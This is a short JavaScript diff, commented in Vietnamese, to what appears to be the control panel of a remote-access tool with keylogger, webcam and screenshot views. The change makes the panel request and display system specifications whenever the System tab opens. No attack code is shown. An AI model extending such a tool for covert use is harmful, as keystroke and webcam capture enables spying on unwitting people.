@@ -16,7 +16,7 @@ const originalAttachViewListeners = window.attachViewListeners || function(){};
 function handleResponse(data) {
     if (!data) return;
 
-    if (data.action === 'sys_specs' && state.currentView === 'processes') {
+    if (data.action === 'sys_specs') {
         const specs = data.response; // Object chứa: CpuName, GpuName, ...
         
         // Helper gán text an toàn
@@ -277,7 +277,11 @@ function switchView(view) {
         case 'screenshot': html = Views.renderScreenshotView(); break;
         case 'keylogger': html = Views.renderKeyloggerDisplay(); break;
         case 'webcam': html = Views.renderWebcamControl(); break;
-        case 'system': html = Views.renderSystemControls(); break;
+        case 'system': 
+            html = Views.renderSystemControls(); 
+            // THÊM: Gửi lệnh lấy thông số khi vào tab System
+            setTimeout(() => sendCommand('sys_specs'), 100); 
+            break;
     }
     
     area.innerHTML = html;
